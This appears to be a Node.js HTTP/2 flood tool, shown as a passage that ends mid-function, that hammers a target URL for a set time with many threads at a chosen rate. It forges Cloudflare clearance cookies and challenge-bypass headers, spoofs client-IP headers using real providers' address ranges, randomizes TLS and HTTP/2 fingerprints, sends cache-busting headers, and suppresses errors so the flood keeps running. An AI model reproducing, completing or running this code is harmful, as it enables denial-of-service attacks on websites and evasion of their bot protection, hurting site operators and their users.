const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const chalk = require('chalk');

process.env.UV_THREADPOOL_SIZE = os.cpus().length;

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        console.log(e);
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

const statusesQ = [];
let statuses = {};
let rawConnections = 0;
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let STREAMID_RESET = 0;
let timer = 0;

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = parseInt(process.argv[4]);
setTimeout(() => {
    process.exit(1);
}, time * 1000);
const threads = parseInt(process.argv[5]);
const ratelimit = parseInt(process.argv[6]);
const queryIndex = process.argv.indexOf('--randpath');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) / 2 : 0;
const connectFlag = process.argv.includes('--connect');
const forceHttpIndex = process.argv.indexOf('--http');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;
const cacheIndex = process.argv.indexOf('--cache');
const enableCache = cacheIndex !== -1;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
const fakeBotIndex = process.argv.indexOf('--fakebot');
const fakeBot = fakeBotIndex !== -1 && fakeBotIndex + 1 < process.argv.length ? process.argv[fakeBotIndex + 1].toLowerCase() === 'true' : false;
const authIndex = process.argv.indexOf('--authorization');
const authValue = authIndex !== -1 && authIndex + 1 < process.argv.length ? process.argv[authIndex + 1] : undefined;

if (!reqmethod || !target || !time || !threads || !ratelimit) {
    console.clear();
    console.log(`node raw.js <GET> <target> <time> <thread> <rate>
--debug - hi
--full - hello
    `);


    process.exit(1);
}
if (!target.startsWith('https://')) {
    console.error('Protocol only supports https://');
    process.exit(1);
}

const getRandomChar = () => {
    const alphabet = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * alphabet.length);
    return alphabet[randomIndex];
};
let randomPathSuffix = '';
setInterval(() => {
    randomPathSuffix = `${getRandomChar()}`;
}, 3333);
let hcookie = '';
let currentRefererValue = refererValue === 'rand' ? 'https://' + randstr(6) + ".net" : refererValue;
if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
    hcookie = `__cf_bm=${randstr(23)}_${randstr(19)}-${timestampString}-1-${randstr(4)}/${randstr(65)}+${randstr(16)}=; cf_clearance=${randstr(35)}_${randstr(7)}-${timestampString}-0-1-${randstr(8)}.${randstr(8)}.${randstr(8)}-0.2.${timestampString}`;
}
if (cookieValue) {
    if (cookieValue === '%RAND%') {
        hcookie = hcookie ? `${hcookie}; ${randstr(6)}=${randstr(6)}` : `${randstr(6)}=${randstr(6)}`;
    } else {
        hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
    }
}
const url = new URL(target);

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload]);
    return frame;
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;

    let payload = Buffer.alloc(0);

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);

        if (payload.length + offset != length) {
            return null;
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function encodeRstStream(streamId, errorCode = 0) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(3, 4);
    frameHeader.writeUInt32BE(streamId, 5);
    const payload = Buffer.alloc(4);
    payload.writeUInt32BE(errorCode, 0);
    return Buffer.concat([frameHeader, payload]);
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function shuffle(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}
function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const legitIP = generateLegitIP();

function generateLegitIP() {
    const asnData = [
      { asn: "AS15169",   country: "US", ip: "8.8.8."       }, // Google
      { asn: "AS16509",   country: "US", ip: "3.120.0."     }, // Amazon
      { asn: "AS8075",    country: "US", ip: "13.107.21."   }, // Microsoft
      { asn: "AS13335",   country: "US", ip: "104.16.0."    }, // Cloudflare US
      { asn: "AS54113",   country: "US", ip: "104.244.42."  },
      { asn: "AS32934",   country: "US", ip: "157.240.0."   },
      { asn: "AS5410",    country: "US", ip: "23.235.33."   },
      { asn: "AS1653",    country: "US", ip: "152.199.19."  },
      { asn: "AS7018",    country: "US", ip: "96.44.0."     }, // AT&T
      { asn: "AS3356",    country: "US", ip: "80.239.60."   }, // Lumen / Level 3
      { asn: "AS701",     country: "US", ip: "208.80.0."    }, // Verizon example
      { asn: "AS26347",   country: "CA", ip: "64.68.0."     }, // Bell Canada (example)
      { asn: "AS577",     country: "CA", ip: "64.71.0."     }, // Rogers (example)
      { asn: "AS28573",   country: "NG", ip: "154.113.0."   }, // Actually Nigeria, but placeholder
      { asn: "AS24961",   country: "BR", ip: "2804.14.0."    },
      { asn: "AS28573",   country: "BR", ip: "45.5.0."       }, // Another Brazil
      { asn: "AS20001",   country: "AR", ip: "181.49.0."     }, // Argentina ISP (example)
      { asn: "AS28573",   country: "MX", ip: "189.225.0."    }, // Mexico ISP (example)
      { asn: "AS24940",   country: "DE", ip: "141.105.64."   }, // Hetzner DE
      { asn: "AS16276",   country: "FR", ip: "185.33.0."     }, // OVH FR
      { asn: "AS8452",    country: "NL", ip: "31.13.64."     }, // Facebook EU example
      { asn: "AS6805",    country: "GB", ip: "51.140.0."     }, // Example UK ISP
      { asn: "AS32934",   country: "IE", ip: "157.240.2."    }, // Meta in IE
      { asn: "AS9009",    country: "CH", ip: "84.211.0."     }, // Swisscom
      { asn: "AS680",     country: "SE", ip: "194.225.0."    }, // Swedish ISP (example)
      { asn: "AS3301",    country: "RU", ip: "5.8.0."        }, // Example Russia ISP
      { asn: "AS36992",   country: "ZA", ip: "41.0.0."        }, // South Africa ISP (example)
      { asn: "AS37100",   country: "KE", ip: "102.65.0."      }, // Kenya ISP (example)
      { asn: "AS36948",   country: "NG", ip: "105.112.0."     }, // Nigeria ISP
      { asn: "AS36928",   country: "EG", ip: "197.248.0."     }, // Egypt ISP (example)
      { asn: "AS29049",   country: "IL", ip: "23.222.0."      }, // Israel ISP (example)
      { asn: "AS42204",   country: "SA", ip: "2.224.0."       }, // Saudi Arabia (example)
      { asn: "AS47966",   country: "AE", ip: "94.200.0."      }, // UAE (example)
      { asn: "AS7643",    country: "VN", ip: "123.30.134."    },
      { asn: "AS18403",   country: "VN", ip: "14.160.0."      },
      { asn: "AS24086",   country: "VN", ip: "42.112.0."      },
      { asn: "AS38733",   country: "VN", ip: "103.2.224."     },
      { asn: "AS45543",   country: "VN", ip: "113.22.0."      },
      { asn: "AS7602",    country: "VN", ip: "27.68.128."     },
      { asn: "AS131127",  country: "VN", ip: "103.17.88."     },
      { asn: "AS140741",  country: "VN", ip: "103.167.198."   },
      { asn: "AS983",     country: "AU", ip: "1.1.1."         }, // example Australian prefix
      { asn: "AS7552",    country: "AU", ip: "49.255.0."      },
      { asn: "AS9829",    country: "IN", ip: "103.21.244."    },
      { asn: "AS55836",   country: "IN", ip: "103.64.0."      },
      { asn: "AS4837",    country: "CN", ip: "218.104.0."     },
      { asn: "AS9808",    country: "HK", ip: "203.81.0."      },
      { asn: "AS4528",    country: "TW", ip: "61.220.0."      },
      { asn: "AS13238",   country: "KR", ip: "13.124.0."      }, // Korea (example)
      { asn: "AS18101",   country: "TH", ip: "103.5.0."       }, // Thailand (example)
      { asn: "AS7545",    country: "MY", ip: "103.5.0."       }, // Malaysia (example)
      { asn: "AS10048",   country: "PH", ip: "202.57.32."     }, // Philippines (example)
      { asn: "AS4808",    country: "JP", ip: "153.127.0."     }, // Japan (example)
      { asn: "AS40027",   country: "US", ip: "198.41.128."     },
      { asn: "AS396982",  country: "NL", ip: "45.79.0."        }
    ];
    const data = asnData[Math.floor(Math.random() * asnData.length)];
    return `${data.ip}${Math.floor(Math.random() * 255)}`;
}

function generateAlternativeIPHeaders() {
    const headers = {};

    if (Math.random() < 0.5) headers["cdn-loop"] = `${generateLegitIP()}:${randstr(5)}`;
    if (Math.random() < 0.4) headers["true-client-ip"] = generateLegitIP();
    if (Math.random() < 0.5) headers["via"] = `1.1 ${generateLegitIP()}`;
    if (Math.random() < 0.6) headers["request-context"] = `appId=${randstr(8)};ip=${generateLegitIP()}`;
    if (Math.random() < 0.4) headers["x-edge-ip"] = generateLegitIP();
    if (Math.random() < 0.3) headers["x-coming-from"] = generateLegitIP();
    if (Math.random() < 0.4) headers["akamai-client-ip"] = generateLegitIP();

    if (Object.keys(headers).length === 0) {
        headers["cdn-loop"] = `${generateLegitIP()}:${randstr(5)}`;
    }

    return headers;
}


function generateDynamicHeaders() {
    // Helper function for random integers
    function getRandomInt(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    // Extract from fingerprint
    const isMobile = fingerprint.navigator.userAgent.includes('Mobile') ||
                     fingerprint.navigator.userAgent.includes('Android');
    const userAgent = fingerprint.navigator.userAgent;

    // Parse Chrome version from user agent (more reliable)
    let chromeVersion = 133;
    const chromeMatch = userAgent.match(/Chrome\/(\d+)/);
    if (chromeMatch) {
        chromeVersion = parseInt(chromeMatch[1]);
    }

    // Generate full version with realistic build numbers
    const secChUaFullVersion = `${chromeVersion}.0.${getRandomInt(6800, 7200)}.${getRandomInt(80, 180)}`;

    // Detect OS from user agent
    let selectedPlatform;
    let platformVersion;

    if (userAgent.includes('Windows NT 10.0')) {
        selectedPlatform = 'Windows';
        platformVersion = '10.0.0';
    } else if (userAgent.includes('Windows NT 11.0') || userAgent.includes('Windows NT 10.0; Win64')) {
        selectedPlatform = 'Windows';
        platformVersion = Math.random() > 0.5 ? '10.0.0' : '11.0.0';
    } else if (userAgent.includes('Macintosh') || userAgent.includes('Mac OS X')) {
        selectedPlatform = 'macOS';
        const macMatch = userAgent.match(/Mac OS X (\d+)_(\d+)_(\d+)/);
        if (macMatch) {
            platformVersion = `${macMatch[1]}.${macMatch[2]}.${macMatch[3]}`;
        } else {
            platformVersion = `${getRandomInt(12, 14)}.${getRandomInt(0, 6)}.0`;
        }
    } else if (userAgent.includes('Linux') && !userAgent.includes('Android')) {
        selectedPlatform = 'Linux';
        platformVersion = `${getRandomInt(5, 6)}.${getRandomInt(0, 19)}.0`;
    } else if (userAgent.includes('Android')) {
        selectedPlatform = 'Android';
        const androidMatch = userAgent.match(/Android (\d+)/);
        if (androidMatch) {
            platformVersion = `${androidMatch[1]}.0.0`;
        } else {
            platformVersion = '14.0.0';
        }
    } else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) {
        selectedPlatform = 'iOS';
        const iosMatch = userAgent.match(/CPU iPhone OS (\d+)_(\d+)/);
        if (iosMatch) {
            platformVersion = `${iosMatch[1]}.${iosMatch[2]}.0`;
        } else {
            platformVersion = '17.0.0';
        }
    } else {
        selectedPlatform = 'Windows';
        platformVersion = '10.0.0';
    }

    // Architecture based on hardware (more realistic)
    const hardwareConcurrency = fingerprint.navigator.hardwareConcurrency || 8;
    const architecture = hardwareConcurrency >= 8 ? 'x86' : 'arm';
    const bitness = hardwareConcurrency >= 4 ? '64' : '32';

    // Extract mobile model from user agent
    let mobileModel = '';
    if (isMobile && userAgent.includes('Android')) {
        const modelMatch = userAgent.match(/\(Linux; Android \d+; ([^)]+)\)/);
        if (modelMatch) {
            mobileModel = modelMatch[1];
        }
    }

    // Generate sec-ch-ua with CORRECT format (quotes around BOTH brand and version)
    const secChUa = `"Google Chrome";v="${chromeVersion}", "Chromium";v="${chromeVersion}", "Not-A.Brand";v="24"`;

    // Full version list
    const secChUaFullVersionList = `"Google Chrome";v="${secChUaFullVersion}", "Chromium";v="${secChUaFullVersion}", "Not-A.Brand";v="24.0.0.0"`;

    // Language handling
    const languages = fingerprint.navigator.languages || ['en-US', 'en'];
    const acceptLanguage = languages
        .map((lang, i) => i === 0 ? lang : `${lang};q=0.${9 - i}`)
        .join(',');

    // ===== BUILD HEADERS IN CORRECT ORDER =====
    const dynamicHeaders = {
        'user-agent': userAgent,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': acceptLanguage,
        'accept-encoding': 'gzip, deflate, br, zstd',
        'sec-ch-ua': secChUa,
        'sec-ch-ua-mobile': isMobile ? '?1' : '?0',
        'sec-ch-ua-platform': `"${selectedPlatform}"`,
        'sec-ch-ua-platform-version': `"${platformVersion}"`,
        'sec-ch-ua-arch': `"${architecture}"`,
        'sec-ch-ua-bitness': `"${bitness}"`,
        'sec-ch-ua-model': isMobile && mobileModel ? `"${mobileModel}"` : '""',
        'sec-ch-ua-full-version-list': secChUaFullVersionList,
        'sec-fetch-site': 'none',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-dest': 'document',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'dnt': Math.random() > 0.88 ? '1' : undefined, // Only 12% have DNT
        'referer': undefined // Set dynamically based on navigation context
    };

    // ===== CRITICAL: CHROME 133 HEADER ORDER (Feb 2026) =====
    // This order is fingerprinted by servers - must be exact
    const headerOrder = [
        'accept',
        'sec-fetch-site',
        'sec-fetch-mode',
        'sec-fetch-dest',
        'sec-fetch-user',
        'accept-encoding',
        'accept-language',
        'sec-ch-ua',
        'sec-ch-ua-mobile',
        'sec-ch-ua-platform',
        'sec-ch-ua-platform-version',
        'sec-ch-ua-arch',
        'sec-ch-ua-bitness',
        'sec-ch-ua-model',
        'sec-ch-ua-full-version-list',
        'upgrade-insecure-requests',
        'user-agent',
        'referer',
        'dnt'
    ];

    // Filter out undefined values and maintain order
    const orderedHeaders = headerOrder
        .filter(key => dynamicHeaders[key] !== undefined)
        .map(key => [key, dynamicHeaders[key]]);
    return orderedHeaders;
}
function generateCfClearanceCookie() {
    const timestamp = Math.floor(Date.now() / 1000);
    const challengeId = crypto.randomBytes(8).toString('hex');
    const clientId = randstr(32); // Upgraded: 16 -> 32
    const version = getRandomInt(18100, 18350); // Upgraded: 17494-17500 -> 18100-18350
    const hashPart = crypto
        .createHash('sha256')
        .update(`${clientId}${timestamp}${fingerprint.ja3}${fingerprint.navigator?.userAgent || ''}`) // Upgraded: added userAgent
        .digest('hex')
        .substring(0, 32); // Upgraded: 16 -> 32

    const cookieParts = [
        `${clientId}`,
        `${challengeId}-${version}`,
        `${timestamp}`,
        hashPart
    ];

    return `cf_clearance=${cookieParts.join('.')}`;
}

function generateChallengeHeaders() {
    const challengeToken = randstr(64); // Upgraded: 32 -> 64
    const challengeResponse = crypto
        .createHash('sha256') // Upgraded: md5 -> sha256
        .update(`${challengeToken}${fingerprint.canvas}${fingerprint.webgl || ''}${timestamp}`) // Upgraded: added webgl
        .digest('hex');

    return [
        ['cf-chl-bypass', '1'],
        ['cf-chl-tk', challengeToken],
        ['cf-chl-response', challengeResponse.substring(0, 32)] // Upgraded: 16 -> 32
    ];
}

function generateAuthorizationHeader(authValue) {
    if (!authValue) return null;
    const [type, ...valueParts] = authValue.split(':');
    const value = valueParts.join(':');
    if (type.toLowerCase() === 'bearer') {
        if (value === '%RAND%') {
            const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
            const payload = Buffer.from(JSON.stringify({ sub: randstr(8), iat: Math.floor(Date.now() / 1000) })).toString('base64url');
            const signature = crypto.createHmac('sha256', randstr(16)).update(`${header}.${payload}`).digest('base64url');
            return `Bearer ${header}.${payload}.${signature}`;
        }
        return `Bearer ${value.replace('%RAND%', randstr(16))}`;
    } else if (type.toLowerCase() === 'basic') {
        const [username, password] = value.split(':');
        if (!username || !password) return null;
        const credentials = Buffer.from(`${username.replace('%RAND%', randstr(8))}:${password.replace('%RAND%', randstr(8))}`).toString('base64');
        return `Basic ${credentials}`;
    } else if (type.toLowerCase() === 'custom') {
        return value.replace('%RAND%', randstr(16));
    }
    return null;
}

function getRandomMethod() {
    const methods = ['POST', 'HEAD', 'GET', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'CONNECT', 'TRACE'];
    return methods[Math.floor(Math.random() * methods.length)];
}

const cache_bypass = [
    {'cache-control': 'max-age=0'},
    {'pragma': 'no-cache'},
    {'expires': '0'},
    {'x-bypass-cache': 'true'},
    {'x-cache-bypass': '1'},
    {'x-no-cache': '1'},
    {'cache-tag': 'none'},
    {'clear-site-data': '"cache"'},
];

function generateJA3Fingerprint() {
    const ciphers = [
        'TLS_AES_128_GCM_SHA256',
        'TLS_AES_256_GCM_SHA384',
        'TLS_CHACHA20_POLY1305_SHA256',
        'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
        'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
        'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
        'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
        'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
        'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
        'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA'
    ];

    const signatureAlgorithms = [
        'ecdsa_secp256r1_sha256',
        'rsa_pss_rsae_sha256',
        'rsa_pkcs1_sha256',
        'ecdsa_secp384r1_sha384',
        'rsa_pss_rsae_sha384',
        'rsa_pkcs1_sha384'
    ];

    const curves = [
        'X25519',
        'X448',
        'secp256r1',
        'secp384r1',
        'secp521r1',
        'ffdhe2048',
        'ffdhe3072',
        'ffdhe4096',
        'ffdhe6144',
        'ffdhe8192'
    ];

    const extensions = [
        '0',
        '5',
        '10',
        '13',
        '16',
        '18',
        '21',
        '23',
        '27',
        '35',
        '43',
        '45',
        '51',
        '65281',
        '17513'
    ];

    const shuffledCiphers = shuffle([...ciphers]).slice(0, Math.floor(Math.random() * 4) + 6);
    const shuffledSigAlgs = shuffle([...signatureAlgorithms]).slice(0, Math.floor(Math.random() * 2) + 3);
    const shuffledCurves = shuffle([...curves]);
    const shuffledExtensions = shuffle([...extensions]).slice(0, Math.floor(Math.random() * 3) + 10);

    return {
        ciphers: shuffledCiphers,
        signatureAlgorithms: shuffledSigAlgs,
        curves: shuffledCurves,
        extensions: shuffledExtensions,
        padding: Math.random() > 0.3 ? getRandomInt(0, 100) : 0
    };
}

function generateHTTP2Fingerprint() {
    const settings = {
        HEADER_TABLE_SIZE: [4096, 16384],
        ENABLE_PUSH: [0, 1],
        MAX_CONCURRENT_STREAMS: [1000, 2000],
        INITIAL_WINDOW_SIZE: [65535, 262144],
        MAX_FRAME_SIZE: [16384, 65536],
        MAX_HEADER_LIST_SIZE: [8192, 32768],
        ENABLE_CONNECT_PROTOCOL: [0, 1]
    };

    const http2Settings = {};
    for (const [key, values] of Object.entries(settings)) {
        http2Settings[key] = values[Math.floor(Math.random() * values.length)];
    }

    return http2Settings;
}


const ja3Fingerprint = generateJA3Fingerprint();
const http2Fingerprint = generateHTTP2Fingerprint();
function generateBrowserFingerprint(fakeBot = false, platform = 'random') {
    // Crypto compatibility (Node.js vs Browser)
    const crypto = typeof window !== 'undefined'
        ? window.crypto
        : require('crypto');

    // Helper function for random integers
    function getRandomInt(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    // Helper to generate MD5 hash (browser-compatible)
    async function md5Hash(str) {
        if (typeof window !== 'undefined' && window.crypto && window.crypto.subtle) {
            const msgBuffer = new TextEncoder().encode(str);
            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
            const hashArray = Array.from(new Uint8Array(hashBuffer));
            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('').substring(0, 32);
        } else {
            return crypto.createHash('md5').update(str).digest('hex');
        }
    }

    // Determine platform if random
    if (platform === 'random') {
        platform = Math.random() > 0.7 ? 'mobile' : 'desktop';
    }

    // ===== DESKTOP CONFIGURATIONS =====
    const desktopScreens = [
        { width: 1920, height: 1080, ratio: 1 },
        { width: 2560, height: 1440, ratio: 1 },
        { width: 1366, height: 768, ratio: 1 },
        { width: 1536, height: 864, ratio: 1.25 },
        { width: 3840, height: 2160, ratio: 1.5 }
    ];

    const desktopGPUs = {
        windows: [
            { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 3060, Direct3D11 vs_5_0 ps_5_0)", hw: [8, 12, 16] },
            { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 4070, Direct3D11 vs_5_0 ps_5_0)", hw: [12, 16] },
            { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce GTX 1660 Ti, Direct3D11 vs_5_0 ps_5_0)", hw: [6, 8] },
            { vendor: "Google Inc. (Intel)", renderer: "ANGLE (Intel, Intel(R) UHD Graphics 620, Direct3D11 vs_5_0 ps_5_0)", hw: [8, 16] },
            { vendor: "Google Inc. (Intel)", renderer: "ANGLE (Intel, Intel(R) Iris(R) Xe Graphics, Direct3D11 vs_5_0 ps_5_0)", hw: [8, 16, 32] },
            { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 6700 XT, Direct3D11 vs_5_0 ps_5_0)", hw: [12, 16] },
            { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 7900 XTX, Direct3D11 vs_5_0 ps_5_0)", hw: [16, 32] }
        ],
        mac: [
            { vendor: "Apple Inc.", renderer: "Apple M1", hw: [8, 16] },
            { vendor: "Apple Inc.", renderer: "Apple M2", hw: [8, 16, 24] },
            { vendor: "Apple Inc.", renderer: "Apple M3", hw: [8, 18, 24] },
            { vendor: "Apple Inc.", renderer: "Apple M3 Pro", hw: [18, 36] },
            { vendor: "Apple Inc.", renderer: "Apple M4 Max", hw: [36, 48] }
        ],
        linux: [
            { vendor: "Intel", renderer: "Mesa Intel(R) UHD Graphics 770 (ADL-S GT1)", hw: [16, 32] },
            { vendor: "X.Org", renderer: "AMD Radeon RX 6700 XT (RADV NAVI22)", hw: [12, 16] },
            { vendor: "NVIDIA Corporation", renderer: "NVIDIA GeForce RTX 3080/PCIe/SSE2", hw: [10, 12, 16] }
        ]
    };

    // ===== MOBILE CONFIGURATIONS =====
    const mobileScreens = [
        { width: 393, height: 852, ratio: 3, device: 'iPhone 14 Pro' },
        { width: 430, height: 932, ratio: 3, device: 'iPhone 15 Pro Max' },
        { width: 360, height: 800, ratio: 2.75, device: 'Samsung Galaxy S21' },
        { width: 412, height: 915, ratio: 2.625, device: 'Pixel 7' },
        { width: 390, height: 844, ratio: 3, device: 'iPhone 13' }
    ];

    const mobileGPUs = [
        { vendor: "Apple Inc.", renderer: "Apple A17 Pro GPU", hw: [6, 8] },
        { vendor: "Apple Inc.", renderer: "Apple A16 GPU", hw: [6] },
        { vendor: "Qualcomm", renderer: "Adreno (TM) 740", hw: [8, 12] },
        { vendor: "Qualcomm", renderer: "Adreno (TM) 730", hw: [8, 12] },
        { vendor: "ARM", renderer: "Mali-G720", hw: [8, 12] },
        { vendor: "ARM", renderer: "Mali-G78", hw: [6, 8] }
    ];

    // ===== LANGUAGE CONFIGURATIONS =====
    const languages = [
        { lang: "en-US,en;q=0.9", tz: -300, region: "US" },
        { lang: "en-GB,en;q=0.9", tz: 0, region: "GB" },
        { lang: "vi-VN,vi;q=0.9,en;q=0.8", tz: 420, region: "VN" },
        { lang: "zh-CN,zh;q=0.9,en;q=0.8", tz: 480, region: "CN" },
        { lang: "ja-JP,ja;q=0.9,en;q=0.8", tz: 540, region: "JP" },
        { lang: "de-DE,de;q=0.9,en;q=0.8", tz: 60, region: "DE" },
        { lang: "fr-FR,fr;q=0.9,en;q=0.8", tz: 60, region: "FR" },
        { lang: "es-ES,es;q=0.9,en;q=0.8", tz: 60, region: "ES" },
        { lang: "pt-BR,pt;q=0.9,en;q=0.8", tz: -180, region: "BR" }
    ];

    // ===== JA4 COMPONENTS (2026 STANDARD) =====
    const tlsCipherSuites = [
        "4865", "4866", "4867", // TLS 1.3 ciphers
        "49195", "49199", "52393", "52392", "49196", "49200", // TLS 1.2 ciphers
        "49171", "49172", "156", "157", "47", "53"
    ];

    const tlsExtensions = [
        "0", "23", "65281", "10", "11", "35", "16", "5", "34", "51",
        "43", "13", "45", "28", "21", "18", "27", "17513", "41"
    ];

